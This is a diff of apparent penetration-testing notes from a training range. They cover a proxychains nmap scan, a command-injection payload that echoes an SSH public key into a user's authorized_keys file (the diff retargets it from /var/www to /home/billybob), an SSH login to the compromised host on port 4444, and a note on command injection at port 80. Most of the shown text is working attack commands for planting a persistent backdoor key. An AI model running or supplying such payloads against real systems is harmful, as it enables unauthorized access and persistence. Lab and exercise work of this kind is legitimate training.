@@ -111,10 +111,15 @@ proxychains nmap 10.100.28.55 -T5 --script=http-enum
 
 ??##result
 
-## ssh keygen script(make .ssh dir first)
-; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDKkgCcdA8guiZGSqbpeFuP0fgCE2pcpmPbgG6b+MeaoW1Jb50CiUxbpwvG2/TZ71+CVyzhcSnGwqK7K7XY//nNopqtvK5wqPd/WKIz1xidHdT3E5X+ejSzS0FwP4HFU76W/B6rJC/UB6g+Tr0VPpZ3RZyVmvMau1WCrQKLGpGt/Pkk7phrTVhe4pkDQClLiKCiFppzNQbK56LVCr0cZQsoqhI8cevCNq4ZtALMBMp6AX/6cyY69KCA+YLDqu2iYzXL6uV+ehefp/qeM0KDqJPcsfYJ+8pQn9Ijo2YKsdlZugFqxlLbz9J9R3+EzpR4WqMOznotxpzCG4IIkBMg6KoJ6JCHBazEOBO1CHPp+9bX+L7EohgzSf+N6nLifSeCBhTZj4yhDfppi7nZmZ7wy0hSGzDNH0ClBU4ZZGoXhaGI12T1zBplW/Xv4IaylII0MLF4alvZip20M/W1Hu7hIrpGaNrryQB5xcFDR/dajdN/hvFlVvuVNezxQ9sUUEHe/EQh9BNhTFFWgeMznOD+YVN3QhwgLIXByC62bE3BacVuJPn3hzMpao2fv/T0R6B1zPann05RkYOKX7pDrKICYcaY8LvDY6sl93a6ENb1GKHBoVTw4AoVGWV8MwgC+PFstPHGefMzqTHmXrnx623xtl60TxJcQAriztiyCiuFcKThtQ== student@lin.internet.donovia" > /var/www/.ssh/authorized_keys
+## ssh keygen script(make .ssh dir first) use the lin ops key
+; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDKkgCcdA8guiZGSqbpeFuP0fgCE2pcpmPbgG6b+MeaoW1Jb50CiUxbpwvG2/TZ71+CVyzhcSnGwqK7K7XY//nNopqtvK5wqPd/WKIz1xidHdT3E5X+ejSzS0FwP4HFU76W/B6rJC/UB6g+Tr0VPpZ3RZyVmvMau1WCrQKLGpGt/Pkk7phrTVhe4pkDQClLiKCiFppzNQbK56LVCr0cZQsoqhI8cevCNq4ZtALMBMp6AX/6cyY69KCA+YLDqu2iYzXL6uV+ehefp/qeM0KDqJPcsfYJ+8pQn9Ijo2YKsdlZugFqxlLbz9J9R3+EzpR4WqMOznotxpzCG4IIkBMg6KoJ6JCHBazEOBO1CHPp+9bX+L7EohgzSf+N6nLifSeCBhTZj4yhDfppi7nZmZ7wy0hSGzDNH0ClBU4ZZGoXhaGI12T1zBplW/Xv4IaylII0MLF4alvZip20M/W1Hu7hIrpGaNrryQB5xcFDR/dajdN/hvFlVvuVNezxQ9sUUEHe/EQh9BNhTFFWgeMznOD+YVN3QhwgLIXByC62bE3BacVuJPn3hzMpao2fv/T0R6B1zPann05RkYOKX7pDrKICYcaY8LvDY6sl93a6ENb1GKHBoVTw4AoVGWV8MwgC+PFstPHGefMzqTHmXrnx623xtl60TxJcQAriztiyCiuFcKThtQ== student@lin.internet.donovia" > /home/billybob/.ssh/authorized_keys
 
+##ssh to billiybob
+JB$: ssh -i .ssh/id_rsa billybob@10.100.28.40 -p 4444
 
+## .40:80
+command injection - path to test 
+billybob 
 
 
 
